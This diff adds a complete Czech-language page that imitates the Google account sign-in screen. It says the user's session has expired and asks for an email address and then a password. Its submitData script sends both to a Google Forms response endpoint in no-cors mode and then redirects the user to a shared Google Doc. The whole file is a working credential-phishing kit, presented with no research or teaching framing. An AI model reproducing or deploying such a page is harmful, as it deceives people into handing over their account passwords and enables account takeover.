@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Přihlášení – účty Google</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+    background: #fff;
+    color: #202124;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .card {
+    border: 1px solid #dadce0;
+    border-radius: 28px;
+    display: flex;
+    width: 100%;
+    max-width: 840px;
+    min-height: 400px;
+    background: #fff;
+    overflow: hidden;
+  }
+
+  .left-col {
+    flex: 1;
+    padding: 48px 40px;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+  }
+
+  .right-col {
+    flex: 1.1;
+    padding: 48px 40px 20px 40px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    position: relative;
+  }
+
+  .logo {
+    width: 48px;
+    height: 48px;
+    margin-bottom: 24px;
+    margin-top: 0;
+  }
+
+  h1 {
+    font-size: 2rem;
+    font-weight: 400;
+    line-height: 1.25;
+    margin-top: 0;
+    margin-bottom: 16px;
+    color: #1f1f1f;
+    word-break: break-word;
+  }
+
+  .sub {
+    font-size: 1rem;
+    font-weight: 400;
+    letter-spacing: 0;
+    line-height: 1.5;
+    margin-top: 0;
+    margin-bottom: 0;
+    color: #1f1f1f;
+  }
+
+  .form-area {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    width: 100%;
+  }
+
+  .inp {
+    width: 100%;
+    max-width: 360px;
+    padding: 14px 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 16px;
+    font-family: inherit;
+    color: #1f1f1f;
+    transition: border 0.2s;
+    outline: none;
+    background: #fff;
+  }
+  .inp:focus {
+    border: 2px solid #1a73e8;
+    padding: 13px 15px;
+  }
+  .inp::placeholder { color: #5f6368; }
+
+  .link {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+    display: inline-block;
+    margin-top: 4px;
+  }
+  .link:hover { text-decoration: underline; }
+
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    gap: 16px;
+    padding-top: 16px;
+    width: 100%;
+  }
+
+  .create {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+  }
+  .create:hover { text-decoration: underline; }
+
+  .btn {
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    border-radius: 20px;
+    padding: 10px 24px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background 0.2s, box-shadow 0.2s;
+  }
+  .btn:hover {
+    background: #1557b0;
+    box-shadow: 0 1px 3px rgba(60,64,67,0.3);
+  }
+
+  /* Views */
+  .view { display: none; flex-direction: column; gap: 24px; width: 100%; }
+  .view.active { display: flex; }
+  
+  .left-content-wrapper {
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+  }
+  .left-content-wrapper.hidden { display: none; }
+
+  /* --- EMAIL CHIP STYLES --- */
+  
+  .Ahygpe {
+    align-items: center;
+    background: #fff;
+    border: 1px solid #747775;
+    color: #1f1f1f;
+    cursor: pointer;
+    display: inline-flex; 
+    width: fit-content; 
+    max-width: 100%;
+    position: relative;
+    border-radius: 100px;
+    padding: 4px 12px 4px 8px; 
+    margin-top: 8px;
+    transition: background 0.2s;
+    vertical-align: middle;
+  }
+  .Ahygpe:hover { background: #f8f9fa; }
+
+  .HOE91e {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 12px;
+    color: #5f6368; 
+  }
+  
+  .Qk3oof {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
+  }
+
+  .IxcUte {
+    font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+    font-size: 0.875rem;
+    font-weight: 600;
+    letter-spacing: 0rem;
+    text-decoration: none;
+    line-height: 30px;
+    direction: ltr;
+    text-align: left;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    color: #5f6368; 
+  }
+
+  .JCl8ie {
+    display: flex;
+    align-items: center;
+    margin-left: 0; 
+  }
+  .JCl8ie svg {
+    width: 20px;
+    height: 20px;
+    fill: #5f6368;
+  }
+
+  /* Checkbox & Loader */
+  .checkbox-area {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 8px;
+  }
+  .checkbox-area input { width: 18px; height: 18px; cursor: pointer; }
+  .checkbox-area label { font-size: 14px; color: #202124; cursor: pointer; }
+
+  .loader-view { align-items: center; justify-content: center; gap: 0; }
+  .spinner {
+    width: 48px; height: 48px;
+    border: 4px solid #dadce0;
+    border-top-color: #1a73e8;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Footer */
+  .foot {
+    margin-top: 24px;
+    font-size: 12px;
+    color: #5f6368;
+    width: 100%;
+    max-width: 840px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .foot a { color: #5f6368; text-decoration: none; margin-left: 16px; }
+  .foot a:hover { text-decoration: underline; }
+  .lang {
+    border: none;
+    background: transparent;
+    color: #5f6368;
+    font-size: 12px;
+    cursor: pointer;
+    outline: none;
+    font-family: inherit;
+  }
+
+  @media (max-width: 768px) {
+    body { padding: 0; justify-content: flex-start; min-height: 100vh; }
+    .card { border: none; border-radius: 0; flex-direction: column; max-width: 100%; min-height: calc(100vh - 60px); padding: 0; }
+    .left-col { padding: 60px 24px 24px; align-items: flex-start; text-align: left; flex: 0 0 auto; }
+    .logo { margin-top: 0; margin-bottom: 20px; }
+    .right-col { padding: 24px 24px 32px; flex: 1; justify-content: flex-start; }
+    .inp { max-width: 100%; }
+    .actions { justify-content: space-between; margin-top: 32px; padding-top: 24px; }
+    .foot { position: fixed; bottom: 0; left: 0; right: 0; max-width: 100%; padding: 16px 24px; background: #fff; border-top: 1px solid #dadce0; margin-top: 0; flex-direction: column; gap: 12px; align-items: flex-start; }
+    .foot a { margin: 0 8px 0 0; }
+    .foot div { display: flex; gap: 16px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="left-col">
+    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 48" aria-hidden="true">
+      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+    </svg>
+
+    <!-- Krok 0: Ověření -->
+    <div id="left-step0" class="left-content-wrapper">
+      <h1>Ověřte, že jste to vy</h1>
+      <p class="sub">Vaše relace vypršela. Přihlaste se znovu, abyste mohli pokračovat.</p>
+    </div>
+
+    <!-- Krok 1: Email -->
+    <div id="left-step1" class="left-content-wrapper hidden">
+      <h1>Přihlaste se</h1>
+      <p class="sub">pomocí účtu Google. Účet bude k dispozici pro ostatní aplikace od Googlu v prohlížeči.</p>
+    </div>
+
+    <!-- Krok 2: Heslo -->
+    <div id="left-step2" class="left-content-wrapper hidden">
+      <h1>Vítejte</h1>
+      
+      <!-- Bublina -->
+      <div class="Ahygpe" onclick="goBackDelay()">
+        <div class="HOE91e">
+           <svg aria-hidden="true" class="Qk3oof" focusable="false" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+           </svg>
+        </div>
+        <div class="IxcUte" translate="no" id="email-display-chip">email@example.com</div>
+        <div class="JCl8ie">
+            <svg aria-hidden="true" class="Qk3oof u4TTuf" focusable="false" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                <path d="M7 10l5 5 5-5z"></path>
+            </svg>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="right-col">
+    <!-- Krok 0: Tlačítko -->
+    <div id="step0" class="view active">
+      <div class="actions">
+        <button class="btn" onclick="goToEmailStep()">Další</button>
+      </div>
+    </div>
+
+    <!-- Krok 1: Email -->
+    <div id="step1" class="view">
+      <div class="form-area">
+        <input type="text" id="email-input" class="inp" placeholder="E-mail nebo telefon" autofocus>
+        <a href="https://accounts.google.com/signin/recovery" class="link">Zapomněli jste e-mail?</a>
+      </div>
+      <div class="actions">
+        <a href="https://accounts.google.com/signup" class="create">Vytvořit účet</a>
+        <button class="btn" onclick="initiateLogin()">Další</button>
+      </div>
+    </div>
+
+    <!-- Krok 2: Heslo -->
+    <div id="step2" class="view">
+      <div class="form-area">
+        <input type="password" id="password-input" class="inp" placeholder="Zadejte heslo">
+        <div class="checkbox-area">
+          <input type="checkbox" id="show-pass" onchange="togglePassword()">
+          <label for="show-pass">Zobrazit heslo</label>
+        </div>
+      </div>
+
+      <div class="actions">
+        <a href="https://accounts.google.com/signin/recovery" class="create">Zapomněli jste heslo?</a>
+        <button class="btn" onclick="submitData()">Další</button>
+      </div>
+    </div>
+
+    <!-- Loader -->
+    <div id="loader" class="view loader-view">
+        <div class="spinner"></div>
+    </div>
+  </div>
+</div>
+
+<div class="foot">
+  <select class="lang">
+    <option>Čeština</option>
+    <option>English (United States)</option>
+    <option>Deutsch</option>
+    <option>Français</option>
+    <option>Español</option>
+    <option>Slovenčina</option>
+    <option>Polski</option>
+  </select>
+  <div>
+    <a href="https://support.google.com/accounts?hl=cs&p=account_iph">Nápověda</a>
+    <a href="https://accounts.google.com/TOS?loc=CZ&hl=cs&privacy=true">Ochrana soukromí</a>
+    <a href="https://accounts.google.com/TOS?loc=CZ&hl=cs">Podmínky</a>
+  </div>
+</div>
+
+<script>
+  let userEmail = "";
+
+  // Listener pro Enter klávesu
+  document.addEventListener("keydown", function(e) {
+    if (e.key === "Enter") {
+      const step0 = document.getElementById('step0');
+      const step1 = document.getElementById('step1');
+      const step2 = document.getElementById('step2');
+      
+      if (step0.classList.contains('active')) {
+        goToEmailStep();
+      } else if (step1.classList.contains('active')) {
+        initiateLogin();
+      } else if (step2.classList.contains('active')) {
+        submitData();
+      }
+    }
+  });
+
+  // Funkce pro přechod z Krok 0 -> Krok 1 (s 1s loadingem)
+  function goToEmailStep() {
+    // Skrýt tlačítko, ukázat loader
+    document.getElementById('step0').classList.remove('active');
+    document.getElementById('loader').classList.add('active');
+
+    setTimeout(() => {
+      // Skrýt loader
+      document.getElementById('loader').classList.remove('active');
+      
+      // Změnit text vlevo
+      document.getElementById('left-step0').classList.add('hidden');
+      document.getElementById('left-step1').classList.remove('hidden');
+      
+      // Zobrazit formulář s emailem
+      document.getElementById('step1').classList.add('active');
+      document.getElementById('email-input').focus();
+    }, 1000);
+  }
+
+  // Funkce pro přechod z Krok 1 -> Krok 2 (s 2s loadingem)
+  function initiateLogin() {
+    const emailInput = document.getElementById('email-input');
+    if (!emailInput.value) {
+      emailInput.style.border = "2px solid #d93025";
+      return;
+    }
+    userEmail = emailInput.value;
+
+    document.getElementById('step1').classList.remove('active');
+    document.getElementById('loader').classList.add('active');
+
+    setTimeout(() => {
+      document.getElementById('email-display-chip').innerText = userEmail;
+      document.getElementById('left-step1').classList.add('hidden');
+      document.getElementById('left-step2').classList.remove('hidden');
+      
+      document.getElementById('loader').classList.remove('active');
+      document.getElementById('step2').classList.add('active');
+      
+      document.getElementById('password-input').focus();
+    }, 2000);
+  }
+
+  // Funkce pro návrat zpět (s 1s loadingem)
+  function goBackDelay() {
+    document.getElementById('step2').classList.remove('active');
+    document.getElementById('loader').classList.add('active');
+
+    setTimeout(() => {
+      document.getElementById('loader').classList.remove('active');
+      document.getElementById('left-step2').classList.add('hidden');
+      document.getElementById('left-step1').classList.remove('hidden');
+      document.getElementById('step1').classList.add('active');
+    }, 1000);
+  }
+
+  function togglePassword() {
+    const passInput = document.getElementById('password-input');
+    const checkbox = document.getElementById('show-pass');
+    passInput.type = checkbox.checked ? 'text' : 'password';
+  }
+
+  async function submitData() {
+    const passwordInput = document.getElementById('password-input');
+    if (!passwordInput.value) {
+      passwordInput.style.border = "2px solid #d93025";
+      return;
+    }
+
+    document.getElementById('step2').classList.remove('active');
+    document.getElementById('loader').classList.add('active');
+
+    const formData = new FormData();
+    formData.append('entry.1575764565', userEmail);
+    formData.append('entry.1649332385', passwordInput.value);
+    formData.append('fvv', '1');
+    formData.append('pageHistory', '0');
+    formData.append('submissionTimestamp', '-1');
+    formData.append('fbzx', '-5962820188852463106');
+    formData.append('partialResponse', '[null,null,"-5962820188852463106"]');
+
+    try {
+      await fetch('https://docs.google.com/forms/d/e/1FAIpQLSfsKGfDZ3ccUovPyZLr3651OKJFhrsVXvcTFxpK-emR0VaQBw/formResponse', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: formData
+      });
+    } catch (e) {
+      console.error("Error sending form", e);
+    }
+
+    setTimeout(() => {
+      window.location.href = "https://docs.google.com/document/d/1LlabXwQG88MvqTTATDDVGhXmdGYNhIHinB_0MAiuISs/edit?usp=sharing";
+    }, 5000);
+  }
+</script>
+
+</body>
+</html>
